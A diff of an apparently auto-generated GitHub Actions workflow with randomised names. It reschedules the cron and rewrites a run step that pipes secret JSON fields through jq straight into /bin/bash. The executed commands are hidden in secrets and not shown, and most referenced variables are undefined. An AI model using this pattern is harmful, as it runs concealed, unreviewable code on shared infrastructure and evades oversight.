@@ -2,34 +2,30 @@ name: linzebei1938
 on:
   workflow_dispatch:
   schedule:
-    - cron: '3 1/6 * * *'
+    - cron: '36 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: linzebei1938
         env:
-          hrb41: ${{ secrets.hrb41 }}
+          zcewl5318: ${{ secrets.zcewl5318 }}
         run: |
-          echo $hrb41 | jq -r .i1024 | /bin/bash
-          echo $u80661 | jq -r .ennph3661 | /bin/bash
-          echo $ies79925 | jq -r .m135 | /bin/bash
-          echo $yroo2110 | jq -r .f4 | /bin/bash
-          echo $ndn10 | jq -r .akry2585 | /bin/bash
-          echo $qd18230 | jq -r .wrwzt897 | /bin/bash
-          echo $fjb8791 | jq -r .haeag428 | /bin/bash
-          echo $a0870 | jq -r .cee61104 | /bin/bash
-          echo $nlr66 | jq -r .omcqa17568 | /bin/bash
-          echo $cmsrn5 | jq -r .aeu73503 | /bin/bash
-          echo $tst9538 | jq -r .cfk94418 | /bin/bash
-          echo $gp74 | jq -r .lefaf47811 | /bin/bash
-          echo $xpgw97 | jq -r .qbo75701 | /bin/bash
-          echo $gcrxw791 | jq -r .a9158 | /bin/bash
-          echo $kjyw52790 | jq -r .qlmcb51 | /bin/bash
-          echo $pla28872 | jq -r .pmmb281 | /bin/bash
-          echo $x8 | jq -r .jm26 | /bin/bash
-          echo $l4686 | jq -r .mglr1399 | /bin/bash
-          echo $zi983 | jq -r .vyk93279 | /bin/bash
-          echo $xfdjd6374 | jq -r .yi84 | /bin/bash
+          echo $zcewl5318 | jq -r .w306 | /bin/bash
+          echo $i9112 | jq -r .zb426 | /bin/bash
+          echo $uieij81 | jq -r .a310 | /bin/bash
+          echo $yow5 | jq -r .lifl6 | /bin/bash
+          echo $iypkc63 | jq -r .b4750 | /bin/bash
+          echo $it253 | jq -r .uadl1 | /bin/bash
+          echo $t5668 | jq -r .qlif27162 | /bin/bash
+          echo $swwe6 | jq -r .nd20 | /bin/bash
+          echo $h72 | jq -r .kdlyr07 | /bin/bash
+          echo $kto60518 | jq -r .d509 | /bin/bash
+          echo $a7249 | jq -r .o38880 | /bin/bash
+          echo $dmdyo46 | jq -r .rvrv762 | /bin/bash
+          echo $j0 | jq -r .hjr1356 | /bin/bash
+          echo $uj5 | jq -r .s935 | /bin/bash
+          echo $cat52 | jq -r .ryix4 | /bin/bash
 
